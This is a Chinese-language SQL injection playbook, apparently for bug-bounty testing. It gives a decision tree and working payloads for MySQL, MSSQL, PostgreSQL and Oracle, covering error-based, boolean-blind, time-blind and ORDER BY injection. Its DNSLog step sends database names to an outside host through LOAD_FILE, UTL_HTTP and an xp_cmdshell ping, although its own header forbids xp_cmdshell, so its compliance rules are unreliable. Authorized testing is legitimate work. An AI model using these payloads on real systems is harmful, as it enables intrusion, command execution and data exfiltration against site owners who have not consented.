# §4 SQL注入
### SRC 合规边界（执行前必读）
```
[SRC ALLOWED] 手工payload测注入存在、报错/布尔/时间三类检测、database()/version()证明可读(1-2行)、
              DNSLog OOB带出库名、CASE WHEN排序侧信道
[SRC FORBIDDEN] SQLmap、dump表数据、into outfile写shell、general_log写shell、xp_cmdshell
```

### 识别信号
- `id page orderBy sort keyword search key`

### 场景判断树（先判定场景，再选Payload）
```
发现疑似SQL注入参数?
├── 有报错回显? (如 MySQL error in response)
│   └── 报错注入 → 用updatexml/extractvalue/floor函数
│       证明: 报错信息中包含database()值 → 注入存在 ✅
│
├── 无报错但页面有正常/异常两种状态?
│   └── 布尔盲注 → 用AND 1=1/1=2差异证明
│       证明: 页面正常 vs 空白/报错 → 注入存在 ✅
│
├── 页面始终相同?
│   └── 时间盲注 → 用SLEEP/WAITFOR/big bencmark证明
│       证明: 响应时间明显差异(如3s vs 0.1s) → 注入存在 ✅
│
└── 任何场景都可用DNSLog OOB → 盲注时快速出数据
    证明: DNSLog收到database()的DNS请求 → 注入存在 ✅
```

### 决策流程

```
[Step 0] 判断数据库类型(决定用哪套Payload):
  报错信息含 MySQL / MariaDB → MySQL
  报错信息含 Microsoft OLE DB / SQL Server → MSSQL
  报错信息含 Oracle / ORA- → Oracle
  报错信息含 PostgreSQL / PG:: → PgSQL
  无报错时通过延时函数反向判断(见下方延时表)

[Step 1] 有报错回显 → 报错注入(最快，首选):
  MySQL:
    updatexml(1, concat(0x7e, (select database()), 0x7e), 1)
    extractvalue(1, concat(0x7e, (select database()), 0x7e))
    floor(rand(0)*2) group by → 主键冲突报错
  MSSQL:
    convert(int, db_name())     → 类型转换报错
    1/@@servername              → 除零报错
  PgSQL:
    cast((select version())::text as integer) → 类型转换报错
  Oracle:
    CTXSYS.DRITHSX.SN(user, (select banner from v$version))
    XMLType(chr(123)||(select banner from v$version)||chr(125))

  证明: 报错信息中看到database()/version()返回值 → 注入存在 ✅

[Step 2] 无报错但有真假状态 → 布尔盲注:
  准备: 先用 length() 猜目标长度
  再用 ascii(substr()) + 二分法逐字符比大小
  函数: length() substr() ascii() / ord() mid()
  Payload:
    ?id=1 AND length(database())>5   → 正常=长度>5
    ?id=1 AND ascii(substr(database(),1,1))>64  → 二分法
  证明: 页面在 True/False 间稳定切换 → 注入存在 ✅

[Step 3] 页面完全无差异 → 时间盲注:
  MySQL:    ?id=1 AND IF(length(database())>5, SLEEP(3), 0)
  MSSQL:   ?id=1; IF (LEN(DB_NAME())>5) WAITFOR DELAY '0:0:3'
  PgSQL:   ?id=1 AND (SELECT CASE WHEN LENGTH(CURRENT_DATABASE())>5 THEN pg_sleep(3) ELSE pg_sleep(0) END)
  Oracle:  ?id=1 AND (SELECT CASE WHEN LENGTH(SYS_GUID())>5 THEN dbms_pipe.send_message('x',3) ELSE 0 END FROM dual)--
  补充(绕过sleep): MySQL benchmark(50000000, md5('x'))  /  笛卡尔积大表关联

  证明: 条件为真时响应延迟3s+ → 注入存在 ✅

[Step 4] 任何场景均可 → DNSLog OOB快速确认(盲注加速):
  MySQL:    ?id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.xxxx.dnslog.cn\\a'))
  MSSQL:   ?id=1; DECLARE @s VARCHAR(1024);SET @s='ping '+DB_NAME()+'.xxxx.dnslog.cn';EXEC master..xp_cmdshell @s;
  Oracle:  ?id=1 AND UTL_HTTP.REQUEST('http://'||(SELECT SYS_GUID() FROM dual)||'.xxxx.dnslog.cn/a')=1

  证明: DNSLog 收到含 database() 值的 DNS 请求 → 注入存在 ✅
  [SRC NOTE] 仅带出 database()/version()，不读表数据

[Step 5] ORDER BY / sort 参数的特殊注入(排序语句场景):
  ?sort=id                  → 正常
  ?sort=(CASE WHEN 1=1 THEN id ELSE views END)  → 正常(1=1为真)
  ?sort=(CASE WHEN 1=2 THEN id ELSE views END)  → 排序变化(1=2为假)
  ?sort=(SELECT CASE WHEN SUBSTR(database(),1,1)='t' THEN id ELSE views END)
  证明: 改变排序顺序 → 注入存在 ✅
  补充: ?order=CASE%20WHEN%201=1%20THEN%201%20ELSE%201/(SELECT%200)%20END
       → 异常/除零报错 → 证明注入存在
```

### 场景优先级速记
```
有报错 → 报错注入(最快)  ← 首选
无报错有真假 → 布尔盲注(中等)
完全无差异 → 时间盲注(最慢)  ← 兜底
任何场景 → DNSLog OOB(盲注加速)  ← 推荐
排序参数 → CASE WHEN 排序侧信道  ← 特殊场景
```

### Payload
```
数字:   ?id=3/3  ?id=3-1  ?id=3 AND 1=1
字符:   ?id=1'   ?id=1"   ?id=1')
延时:
  MySQL:  SLEEP(5)  /  BENCHMARK(50000000,MD5('x'))
  MSSQL:  WAITFOR DELAY '0:0:5'
  PgSQL:  pg_sleep(5)
  Oracle: dbms_pipe.send_message('x',5)  /  UTL_INADDR.get_host_name('10.0.0.1')

[SRC] 以上所有Payload均为无害化检测手段
[SRC] 仅证明注入存在/出库名即停止，禁止爆表/dump
```
